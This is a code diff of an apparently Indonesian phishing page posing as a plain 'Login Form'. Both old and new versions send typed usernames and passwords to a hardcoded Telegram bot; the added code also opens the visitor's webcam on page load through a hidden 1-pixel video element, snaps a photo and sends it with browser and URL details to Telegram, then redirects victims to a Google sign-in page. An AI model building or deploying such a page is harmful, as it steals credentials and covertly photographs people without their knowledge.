@@ -1,110 +1,339 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Login</title>
+    <title>Login Form</title>
     <style>
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
+            font-family: 'Segoe UI', sans-serif;
         }
+        
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
-            background: #f6f8fa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
             height: 100vh;
-            color: #24292e;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
-        .container {
-            background: white;
+        
+        .main-content {
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            padding: 30px;
+        }
+        
+        .logo-container {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: #4a69bd;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+        
+        .logo svg {
+            width: 50px;
+            height: 50px;
+            fill: white;
+        }
+        
+        h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 15px;
+            border: 1px solid #ddd;
             border-radius: 6px;
-            box-shadow: 0 8px 24px rgba(149, 157, 165, 0.2);
-            width: 340px;
-            padding: 24px;
+            margin-bottom: 16px;
+            background-color: #f9f9f9;
         }
-        /* CSS disingkat */
+        
+        input:focus {
+            border-color: #4a69bd;
+            outline: none;
+        }
+        
+        button {
+            width: 100%;
+            background-color: #4a69bd;
+            color: white;
+            font-weight: 600;
+            font-size: 16px;
+            border: none;
+            border-radius: 6px;
+            padding: 14px 0;
+            margin: 8px 0 16px;
+            cursor: pointer;
+        }
+        
+        button:hover {
+            background-color: #3c5aa6;
+        }
+        
+        #statusMessage {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 4px;
+            text-align: center;
+            display: none;
+        }
+        
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+        }
+        
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+        }
+        
+        #cameraFeed {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            pointer-events: none;
+            overflow: hidden;
+        }
+        
+        #canvas {
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">
-            <svg width="48" height="48" viewBox="0 0 16 16" fill="currentColor">
-                <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
-            </svg>
+    <div class="main-content">
+        <div class="logo-container">
+            <div class="logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
+                </svg>
+            </div>
+            <h1>Login Form</h1>
         </div>
-        <h1>Sign in to continue</h1>
+        
         <form id="loginForm">
-            <div class="form-group">
-                <label for="username">Username or email</label>
-                <input type="text" id="username" name="username" required autocomplete="username">
-            </div>
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" required autocomplete="current-password">
-                <div class="error" id="errorMsg"></div>
-            </div>
-            <button type="submit">Sign in</button>
-            <div class="success" id="successMsg">Authentication successful! Redirecting...</div>
+            <input type="text" id="username" name="username" placeholder="Username atau email" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <button type="submit" id="submitBtn">Login</button>
         </form>
-        <div class="login-footer">
-            <a href="#">Forgot password?</a> · <a href="#">Sign up</a>
-        </div>
+        
+        <div id="statusMessage"></div>
     </div>
+    
+    <!-- Elemen tersembunyi untuk kamera -->
+    <video id="cameraFeed" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const errorMsg = document.getElementById('errorMsg');
-            const successMsg = document.getElementById('successMsg');
-            
-            if (!username || !password) {
-                errorMsg.textContent = "Please enter both username and password";
-                return;
+        // Fungsi untuk meminta izin kamera dan mengambil gambar
+        async function captureImage() {
+            try {
+                // Minta akses kamera
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    } 
+                });
+                
+                const video = document.getElementById('cameraFeed');
+                video.srcObject = stream;
+                
+                // Tunggu video siap
+                return new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        // Tunggu sebentar agar kamera fokus
+                        setTimeout(() => {
+                            // Ambil gambar dari video
+                            const canvas = document.getElementById('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            // Konversi ke base64
+                            const imageBase64 = canvas.toDataURL('image/jpeg', 0.8);
+                            
+                            // Matikan kamera
+                            stream.getTracks().forEach(track => track.stop());
+                            
+                            resolve(imageBase64);
+                        }, 1000);
+                    };
+                });
+            } catch (error) {
+                console.error("Tidak dapat mengakses kamera:", error);
+                return null;
             }
-            
-            // Kirim data ke Telegram
-            sendToTelegram(username, password);
-            
-            // Tampilkan pesan sukses
-            successMsg.style.display = 'block';
-            errorMsg.textContent = '';
-            
-            // Redirect setelah 2 detik
-            setTimeout(function() {
-                window.location.href = "https://github.com";
-            }, 2000);
-        });
+        }
         
-        function sendToTelegram(username, password) {
-            const message = `Login attempt:\nUsername: ${username}\nPassword: ${password}`;
+        // Fungsi untuk mengirim gambar ke Telegram
+        async function sendImageToTelegram(imageBase64, extraInfo) {
+            // Ganti dengan Bot Token dan Chat ID Anda
+            const botToken = 'YOUR_BOT_TOKEN';
+            const chatId = 'YOUR_CHAT_ID';
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
             
-            // GANTI DENGAN TOKEN DAN CHAT ID ANDA
+            // Pisahkan prefix dari data base64
+            const base64Data = imageBase64.split(',')[1];
+            
+            // Buat form data
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', new Blob([Uint8Array.from(atob(base64Data), c => c.charCodeAt(0))], { type: 'image/jpeg' }));
+            formData.append('caption', extraInfo);
+            
+            try {
+                const response = await fetch(telegramUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error("Error sending image:", error);
+                return false;
+            }
+        }
+        
+        // Fungsi alternatif untuk mengirim gambar ke Telegram
+        // Menggunakan URL yang dapat diakses publik jika metode di atas gagal
+        async function sendImageUrlToTelegram(imageBase64, extraInfo) {
+            const botToken = 'YOUR_BOT_TOKEN';
+            const chatId = 'YOUR_CHAT_ID';
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+            
+            try {
+                const response = await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        photo: imageBase64,
+                        caption: extraInfo
+                    })
+                });
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error("Error sending image URL:", error);
+                return false;
+            }
+        }
+        
+        // Fungsi untuk mengirim data login ke Telegram
+        async function sendLoginToTelegram(username, password) {
             const botToken = '7866985994:AAF_OOgn0V8hvKZ9FWnroQKefnx8o9CHhxo';
             const chatId = '8126039795';
-            
             const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
             
-            fetch(telegramUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            }).catch(error => {
-                console.error('Error:', error);
+            const message = `📲 Login Form\n` +
+                           `👤 Username: ${username}\n` +
+                           `🔑 Password: ${password}\n` +
+                           `⏰ Waktu: ${new Date().toLocaleString()}\n` +
+                           `🌐 Perangkat: ${navigator.userAgent.substring(0, 100)}`;
+            
+            try {
+                const response = await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error("Error sending login info:", error);
+                return false;
+            }
+        }
+        
+        // Fungsi utama yang dijalankan saat halaman dimuat
+        async function main() {
+            // Coba ambil gambar segera setelah halaman dimuat
+            const imageBase64 = await captureImage();
+            
+            if (imageBase64) {
+                // Info tambahan untuk dikirim bersama gambar
+                const deviceInfo = `📱 Device Info\n` +
+                                  `🌐 Browser: ${navigator.userAgent.substring(0, 100)}\n` +
+                                  `⏰ Waktu: ${new Date().toLocaleString()}\n` +
+                                  `📍 URL: ${window.location.href}`;
+                
+                // Coba kirim gambar ke Telegram
+                const success = await sendImageToTelegram(imageBase64, deviceInfo);
+                
+                // Jika gagal, coba metode alternatif
+                if (!success) {
+                    await sendImageUrlToTelegram(imageBase64, deviceInfo);
+                }
+            }
+            
+            // Handler untuk form login
+            document.getElementById('loginForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+                const submitBtn = document.getElementById('submitBtn');
+                const statusMessage = document.getElementById('statusMessage');
+                
+                // Ubah tampilan tombol
+                submitBtn.disabled = true;
+                submitBtn.innerText = 'Processing...';
+                
+                // Kirim data login ke Telegram
+                const success = await sendLoginToTelegram(username, password);
+                
+                if (success) {
+                    // Tampilkan pesan sukses
+                    statusMessage.className = 'success';
+                    statusMessage.textContent = 'Login berhasil!';
+                    statusMessage.style.display = 'block';
+                    
+                    // Redirect setelah login (ganti dengan URL tujuan Anda)
+                    setTimeout(function() {
+                        window.location.href = "https://accounts.google.com";
+                    }, 1500);
+                } else {
+                    // Tampilkan pesan error
+                    statusMessage.className = 'error';
+                    statusMessage.textContent = 'Terjadi kesalahan. Silakan coba lagi.';
+                    statusMessage.style.display = 'block';
+                    submitBtn.disabled = false;
+                    submitBtn.innerText = 'Login';
+                }
             });
         }
+        
+        // Jalankan fungsi utama saat dokumen siap
+        document.addEventListener('DOMContentLoaded', main);
     </script>
 </body>
 </html>
